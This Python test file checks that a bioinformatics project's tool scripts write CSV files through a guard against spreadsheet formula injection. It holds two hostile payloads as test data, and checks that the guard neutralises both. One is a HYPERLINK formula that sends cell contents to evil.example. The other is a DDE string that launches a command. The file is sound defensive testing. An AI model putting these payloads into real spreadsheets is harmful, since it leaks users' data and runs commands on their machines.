"""CLAUDE_v9.7.410_tools_csv_writer_coverage — the CSV formula-injection guard reaches tools/.

Premise (hostile audit H12, CUT_410_COMPOSE_LEDGER.md): the coverage lock shipped by
CLAUDE_v9.7.410_csv_writer_coverage scanned only `mamey/` and `deliverable_tools/`. Under `tools/`,
72 operator scripts (98 sites) still wrote CSV/TSV with plain `csv.writer` / `csv.DictWriter`,
a dozen of them from BLAST / antiSMASH text (`blastp_top_def`, `function_label`, `product`).
Same injection class, same fix: every site now binds the shipped `SafeWriter` /
`SafeDictWriter`, with the bare-script sys.path fallback (bundle root is one level above tools/).
"""
from __future__ import annotations

import csv
import importlib.util
import io
import re
import subprocess
import sys
from pathlib import Path

import pytest

import mamey

pytestmark = pytest.mark.public

BUNDLE_ROOT = Path(mamey.__file__).resolve().parent.parent
TOOLS = BUNDLE_ROOT / "tools"
PLAIN_WRITER_RE = re.compile(r"\b(?:csv|_csv\w*)\.(?:DictWriter|writer)\(")
PAYLOAD = '=HYPERLINK("http://evil.example/"&A1,"x")'


def _load_tool(name: str):
    """Import tools/<name>.py by path the way a test harness would (bundle root on sys.path)."""
    if str(BUNDLE_ROOT) not in sys.path:
        sys.path.insert(0, str(BUNDLE_ROOT))
    spec = importlib.util.spec_from_file_location(f"_tool_{name}", TOOLS / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# ------------------------------------------------------------------------------- coverage lock

def test_tools_has_no_plain_csv_writer_left():
    offenders = {}
    for py in sorted(TOOLS.rglob("*.py")):
        hits = PLAIN_WRITER_RE.findall(py.read_text(encoding="utf-8", errors="replace"))
        if hits:
            offenders[py.relative_to(BUNDLE_ROOT).as_posix()] = len(hits)
    assert not offenders, f"plain csv writers under tools/: {offenders}"


def test_the_sweep_reached_the_named_blast_antismash_writers():
    """The dozen scripts the audit called out by name all bind a safe writer now."""
    named = ("bgc_figures", "blastp_campaign", "arts_ingest", "bigscape_blastp_novelty",
             "antismash_bigscape_join", "bgc_neighbor_layer", "bgc_reference_align",
             "bigscape_merge_anchors", "blastp_coverage_wave", "build_cohort_precompute",
             "build_domain_matrix", "build_domain_reference")
    for name in named:
        text = (TOOLS / f"{name}.py").read_text(encoding="utf-8")
        assert "_SafeWriter(" in text or "_SafeDictWriter(" in text, name
        assert "from mamey.csv_safety import SafeDictWriter as _SafeDictWriter" in text, name


# ------------------------------------------------------------------------ behaviour, end to end

def test_rewritten_tool_writer_neutralises_formula_and_keeps_numbers(tmp_path):
    """A real rewritten writer (ingest_package.atomic_write_csv, the modeb_verdicts.csv producer):
    formula cell prefixed, signed number and lone strand sign untouched."""
    mod = _load_tool("ingest_package")
    out = tmp_path / "verdicts.csv"
    mod.atomic_write_csv(
        [{"bgc": "BGC001", "note": PAYLOAD, "score": "-1.5", "strand": "-", "dde": "=cmd|' /C calc'!A0"}],
        out, ["bgc", "note", "score", "strand", "dde"])
    row = list(csv.DictReader(io.StringIO(out.read_text(encoding="utf-8"))))[0]
    assert row["note"] == "'" + PAYLOAD
    assert row["dde"].startswith("'=")
    assert float(row["score"]) == -1.5 and row["strand"] == "-"


def test_bare_script_fallback_imports_mamey_from_a_foreign_cwd(tmp_path):
    """Run two rewritten tools as bare scripts from an unrelated directory: sys.path[0] is tools/,
    `import mamey` fails there, and the guard block's fallback must put the bundle root on the
    path. `--help` exiting 0 proves the module-level import block succeeded."""
    for tool in ("check_bgc_naming", "round_ledger"):
        proc = subprocess.run([sys.executable, str(TOOLS / f"{tool}.py"), "--help"],
                              cwd=tmp_path, capture_output=True, text=True)
        assert proc.returncode == 0, proc.stderr[-500:]
        assert "usage:" in proc.stdout


def test_library_tool_carries_the_guard_and_an_honest_main_stub(tmp_path):
    """tools/locator_reconciliation.py is imported as a library. It must still carry the sys.path
    guard (test_tool_front_doors) without becoming 'work at import' (test_tools_import_safe), so it
    has the standard block plus a __main__ stub that refuses to run as a CLI."""
    text = (TOOLS / "locator_reconciliation.py").read_text(encoding="utf-8")
    assert "_cs_sys.path.insert(0, _cs_os.path.dirname(_cs_os.path.dirname(" in text
    assert 'if __name__ == "__main__":' in text
    proc = subprocess.run([sys.executable, str(TOOLS / "locator_reconciliation.py")],
                          cwd=tmp_path, capture_output=True, text=True)
    assert proc.returncode == 1 and "library" in proc.stderr
